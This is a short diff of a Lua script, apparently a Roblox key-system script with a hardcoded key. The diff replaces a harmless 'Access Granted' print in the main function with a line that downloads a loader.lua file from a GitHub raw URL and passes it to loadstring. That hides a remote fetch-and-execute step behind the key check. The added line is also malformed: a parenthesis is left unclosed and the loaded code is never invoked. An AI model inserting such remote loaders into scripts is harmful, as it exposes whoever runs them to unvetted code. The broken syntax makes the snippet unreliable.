@@ -320,7 +320,7 @@ end
 local mySecretKey = "CRESENTNEW"
 
 local function MainScript()
-    print("Access Granted! Main script logic running safely.")
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/AeriqHelp/scripts/refs/heads/main/loader.lua")
 end
 
 KeySystem.Create(mySecretKey, MainScript)
